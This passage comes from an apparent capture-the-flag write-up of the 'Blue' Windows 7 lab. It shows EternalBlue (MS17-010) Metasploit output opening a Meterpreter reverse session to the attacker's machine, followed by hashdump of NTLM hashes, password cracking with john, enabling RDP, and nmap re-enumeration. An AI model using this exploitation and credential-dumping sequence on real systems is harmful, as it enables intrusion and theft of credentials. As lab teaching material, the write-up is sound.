</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - 0x00000010  <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>69</span> 6f 6e <span style=color:#ae81ff>61</span> 6c <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>37</span> <span style=color:#ae81ff>36</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>53</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>76</span>  sional <span style=color:#ae81ff>7601</span> Serv
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - 0x00000020  <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>63</span> 6b <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>31</span>                    ice Pack <span style=color:#ae81ff>1</span>      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - Target arch selected valid <span style=color:#66d9ef>for</span> arch indicated by DCE/RPC reply
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Trying exploit with <span style=color:#ae81ff>12</span> Groom Allocations.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Sending all but last fragment of exploit packet
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Starting non-paged pool grooming
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - Sending SMBv2 buffers
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Sending final SMBv2 buffers.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Sending last fragment of exploit packet!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Receiving response from exploit packet
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - ETERNALBLUE overwrite completed successfully <span style=color:#f92672>(</span>0xC000000D<span style=color:#f92672>)</span>!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Sending egg to corrupted connection.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.201.83:445 - Triggering free of corrupted buffer.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>201283</span> bytes<span style=color:#f92672>)</span> to 10.10.201.83
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.10.100.83:4444 -&gt; 10.10.201.83:49198<span style=color:#f92672>)</span> at 2020-11-11 02:08:15 +0000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - <span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - <span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-WIN-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.10.201.83:445 - <span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>-<span style=color:#f92672>=</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>windows/smb/ms17_010_eternalblue<span style=color:#f92672>)</span> &gt; sessions -i <span style=color:#ae81ff>1</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 1...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; getuid 
</span></span><span style=display:flex><span>Server username: NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM
</span></span></code></pre></div><p>SUCCESS! And it left me with <code>NT AUTHORITY\SYSTEM</code> credentials. At this point the machine was mine, but I had to make sure that I had a stable foothold on the machine before proceeding to search for flags.</p><h3 id=foothold>Foothold <a href=#foothold class=anchor>üîó</a></h3><p>The first step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spooler.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; getpid 
</span></span><span style=display:flex><span>Current pid<span style=color:#960050;background-color:#1e0010>:</span> 1304
</span></span><span style=display:flex><span>meterpreter &gt; ps
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Process</span> List
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> PID   PPID  Name                  Arch  Session  User                          Path
</span></span><span style=display:flex><span> 492   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
</span></span><span style=display:flex><span> 560   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.execorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe    NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exes.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exenlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.execes.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exem.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exesvchost.exe           x64   0        NT AUTHORITY\SYSTEM           
</span></span><span style=display:flex><span> 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
</span></span><span style=display:flex><span> 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
</span></span><span style=display:flex><span> 1016  660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exeost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
</span></span><span style=display:flex><span> 1172  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
</span></span><span style=display:flex><span> 1304  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
</span></span><span style=display:flex><span> 1340  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
</span></span><span style=display:flex><span> 1408  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
</span></span><span style=display:flex><span> 1480  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
</span></span><span style=display:flex><span> 1616  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
</span></span><span style=display:flex><span> 1956  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
</span></span><span style=display:flex><span> 2060  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           
</span></span><span style=display:flex><span> 2072  832   WmiPrvSE.exe                                                       
</span></span><span style=display:flex><span> 2184  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
</span></span><span style=display:flex><span> 2220  708   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
</span></span><span style=display:flex><span> 2496  708   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           
</span></span><span style=display:flex><span> 2548  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
</span></span><span style=display:flex><span> 2956  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM           
</span></span><span style=display:flex><span> 2996  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
</span></span></code></pre></div><p>Luckily for me it already looked like it was in the injected in the spool service so there was no need to proceed with a migration.</p><p>Even though I already knew where this host was running from deploying it, the ps output also established that this host was an EC2 instance via the <code>ssm-agent</code>, <code>LiteAgent</code> and <code>Ec2Config</code> processes. This could have also been observed in the nmap scans via the reverse dns lookup, but I thought it was worth calling out.</p><p>Confirmed again with a quick run of the <code>post/windows/gather/checkvm</code> module.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; run post/windows/gather/checkvm 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Checking <span style=color:#66d9ef>if</span> JON-PC is a Virtual Machine ...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> This is a Xen Virtual Machine
</span></span></code></pre></div><p>Finally I grabbed a sysinfo output to confirm a bunch of information that I had already assumed or known.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; sysinfo 
</span></span><span style=display:flex><span>Computer        <span style=color:#960050;background-color:#1e0010>:</span> JON-PC
</span></span><span style=display:flex><span>OS              <span style=color:#960050;background-color:#1e0010>:</span> Windows 7 (6.1 Build 7601, Service Pack 1).
</span></span><span style=display:flex><span>Architecture    <span style=color:#960050;background-color:#1e0010>:</span> x64
</span></span><span style=display:flex><span>System Language <span style=color:#960050;background-color:#1e0010>:</span> en_US
</span></span><span style=display:flex><span>Domain          <span style=color:#960050;background-color:#1e0010>:</span> WORKGROUP
</span></span><span style=display:flex><span>Logged On Users <span style=color:#960050;background-color:#1e0010>:</span> 0
</span></span><span style=display:flex><span>Meterpreter     <span style=color:#960050;background-color:#1e0010>:</span> x64/windows
</span></span></code></pre></div><p>With all this information, I attempted to grab a hashdump to pivot from this shell to a longer-lived user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; hashdump 
</span></span><span style=display:flex><span>Administrator<span style=color:#960050;background-color:#1e0010>:</span>500<span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>31d6cfe0d16ae931b73c59d7e0c089c0::<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>Guest<span style=color:#960050;background-color:#1e0010>:</span>501<span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>31d6cfe0d16ae931b73c59d7e0c089c0::<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>Jon<span style=color:#960050;background-color:#1e0010>:</span>1000<span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>ffb43f0de35be4d9917ac0cc8ad57f8d::<span style=color:#960050;background-color:#1e0010>:</span>
</span></span></code></pre></div><p>And of course, there is Jon. With our hashes and users, I dumped these credentials into a file and ran <code>john</code> against it with Kali&rsquo;s copy of the <code>rockyou.txt</code> password list.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/blue# john --format<span style=color:#f92672>=</span>NT --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt hash.txt 
</span></span><span style=display:flex><span>Created directory: /root/.john
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>2</span> password hashes with no different salts <span style=color:#f92672>(</span>NT <span style=color:#f92672>[</span>MD4 256/256 AVX2 8x3<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Warning: no OpenMP support <span style=color:#66d9ef>for</span> this hash type, consider --fork<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>                 <span style=color:#f92672>(</span>Administrator<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>alqfna22         <span style=color:#f92672>(</span>Jon<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>2g 0:00:00:00 DONE <span style=color:#f92672>(</span>2020-11-11 02:23<span style=color:#f92672>)</span> 3.076g/s 15692Kp/s 15692Kc/s 15700KC/s alr19882006..alpusidi
</span></span><span style=display:flex><span>Warning: passwords printed above might not be all those cracked
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show --format=NT&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed
</span></span></code></pre></div><p>With the Jon user&rsquo;s password in hand, I ran the <code>post/windows/manage/enable_rdp</code> module and was quickly able to connect as the our Jon admin user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; run post/windows/manage/enable_rdp 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Enabling Remote Desktop
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>   RDP is already enabled
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Setting Terminal Services service startup mode
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>   The Terminal Services service is not set to auto, changing it to auto ...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>   Opening port in local firewall <span style=color:#66d9ef>if</span> necessary
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201111022704_default_10.10.201.83_host.windows.cle_997445.txt
</span></span></code></pre></div><h3 id=wrapping-up>Wrapping up <a href=#wrapping-up class=anchor>üîó</a></h3><p>With a new shell I was able to find each of the 3 flags in fairly standard locations on the C:\ drive.</p><ul><li>C:\flag1.txt flag{access_the_machine}</li><li>C:\Windows\system32\config\flag2.txt flag{sam_database_elevated_access}</li><li>C:\Users\Jon\Documents\flag3.txt flag{admin_documents_can_be_valuable}</li></ul><h2 id=attacking-blue-without-metasploit>Attacking Blue without Metasploit <a href=#attacking-blue-without-metasploit class=anchor>üîó</a></h2><p>Now that I had completed the initial attack, I wanted to retry it without the help of metasploit for sourcing, packing and executing the exploit. This imposed the restriction of not having the meterpreter shell to rely on.</p><p>Even though I now understood the attack and the host I decided to run through the motions of host enumeration again. For the sake of brevity, I&rsquo;ll avoid repeating some of the callouts unless there are differences with the first attack.</p><p>I started with the same nmap scan, the only difference being that I instead supplied <code>-oA $ATTACKTARGET</code> to output the results to the host with the target server&rsquo;s ip as a prefix. This functioned to make up for not having the results automatically persisted in <code>msfdb</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/scans# export ATTACKTARGET<span style=color:#f92672>=</span>10.10.87.38
</span></span><span style=display:flex><span>root@kali:~/ctf/scans# nmap -sV -sC -oA $ATTACKTARGET $ATTACKTARGET 
</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-11 02:45 UTC
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-87-38.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.87.38<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00036s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>991</span> closed ports
</span></span><span style=display:flex><span>PORT      STATE SERVICE        VERSION
</span></span><span style=display:flex><span>135/tcp   open  msrpc          Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds   Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> microsoft-ds <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>3389/tcp  open  ms-wbt-server?
</span></span><span style=display:flex><span>|_ssl-date: 2020-11-11T02:47:18+00:00; 0s from scanner time.
</span></span><span style=display:flex><span>49152/tcp open  msrpc          Microsoft Windows RPC
</span></span><span style=display:flex><span>49153/tcp open  msrpc          Microsoft Windows RPC
</span></span><span style=display:flex><span>49154/tcp open  msrpc          Microsoft Windows RPC
</span></span><span style=display:flex><span>49158/tcp open  msrpc          Microsoft Windows RPC
</span></span><span style=display:flex><span>49160/tcp open  msrpc          Microsoft Windows RPC
</span></span><span style=display:flex><span>MAC Address: 02:FF:5C:EF:7E:F3 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_clock-skew: mean: 1h30m00s, deviation: 3h00m00s, median: 0s
</span></span><span style=display:flex><span>|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:ff:5c:ef:7e:f3 <span style=color:#f92672>(</span>unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| smb-os-discovery: 
</span></span><span style=display:flex><span>|   OS: Windows <span style=color:#ae81ff>7</span> Professional <span style=color:#ae81ff>7601</span> Service Pack <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>Windows <span style=color:#ae81ff>7</span> Professional 6.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
</span></span><span style=display:flex><span>|   Computer name: Jon-PC
</span></span><span style=display:flex><span>|   NetBIOS computer name: JON-PC<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|   Workgroup: WORKGROUP<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|_  System time: 2020-11-10T20:47:13-06:00
</span></span><span style=display:flex><span>| smb-security-mode: 
</span></span><span style=display:flex><span>|   account_used: guest
</span></span><span style=display:flex><span>|   authentication_level: user
</span></span><span style=display:flex><span>|   challenge_response: supported
</span></span><span style=display:flex><span>|_  message_signing: disabled <span style=color:#f92672>(</span>dangerous, but default<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   2.02: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2020-11-11T02:47:13
</span></span><span style=display:flex><span>|_  start_date: 2020-11-11T02:35:53
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 152.72 seconds
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/scans# nmap --script smb-enum-shares,smb-enum-users -p <span style=color:#ae81ff>445</span> -oA <span style=color:#e6db74>&#34;</span>$ATTACKTARGET_smb_enum<span style=color:#e6db74>&#34;</span> $ATTACKTARGET 
</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-11 02:52 UTC
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-87-38.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.87.38<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00077s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE
</span></span><span style=display:flex><span>445/tcp open  microsoft-ds
</span></span><span style=display:flex><span>MAC Address: 02:FF:5C:EF:7E:F3 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb-enum-shares: 
</span></span><span style=display:flex><span>|   note: ERROR: Enumerating shares failed, guessing at common ones <span style=color:#f92672>(</span>NT_STATUS_ACCESS_DENIED<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   account_used: &lt;blank&gt;
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>\\</span>10.10.87.38<span style=color:#ae81ff>\A</span>DMIN$: 
</span></span><span style=display:flex><span>|     warning: Couldn<span style=color:#e6db74>&#39;t get details for share: NT_STATUS_ACCESS_DENIED
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Anonymous access: &lt;none&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|   \\10.10.87.38\C$: 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     warning: Couldn&#39;</span>t get details <span style=color:#66d9ef>for</span> share: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span>|     Anonymous access: &lt;none&gt;
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>\\</span>10.10.87.38<span style=color:#ae81ff>\I</span>PC$: 
</span></span><span style=display:flex><span>|     warning: Couldn<span style=color:#960050;background-color:#1e0010>&#39;</span>t get details <span style=color:#66d9ef>for</span> share: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span>|_    Anonymous access: READ
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 2.80 seconds
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/scans# nmap --script vuln -p <span style=color:#ae81ff>445</span> -oA <span style=color:#e6db74>&#34;</span>$ATTACKTARGET_smb_vuln<span style=color:#e6db74>&#34;</span> $ATTACKTARGET 
</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-11 02:53 UTC
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-87-38.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.87.38<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.0011s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE
</span></span><span style=display:flex><span>445/tcp open  microsoft-ds
</span></span><span style=display:flex><span>|_clamav-exec: ERROR: Script execution failed <span style=color:#f92672>(</span>use -d to debug<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>MAC Address: 02:FF:5C:EF:7E:F3 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span>|_smb-vuln-ms10-054: false
</span></span><span style=display:flex><span>|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span>| smb-vuln-ms17-010: 
</span></span><span style=display:flex><span>|   VULNERABLE:
</span></span><span style=display:flex><span>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style=color:#f92672>(</span>ms17-010<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|     State: VULNERABLE
</span></span><span style=display:flex><span>|     IDs:  CVE:CVE-2017-0143
</span></span><span style=display:flex><span>|     Risk factor: HIGH
</span></span><span style=display:flex><span>|       A critical remote code execution vulnerability exists in Microsoft SMBv1
</span></span><span style=display:flex><span>|        servers <span style=color:#f92672>(</span>ms17-010<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>|           
</span></span><span style=display:flex><span>|     Disclosure date: 2017-03-14
</span></span><span style=display:flex><span>|     References:
</span></span><span style=display:flex><span>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span style=display:flex><span>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#f92672>=</span>CVE-2017-0143
</span></span><span style=display:flex><span>|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 15.51 seconds
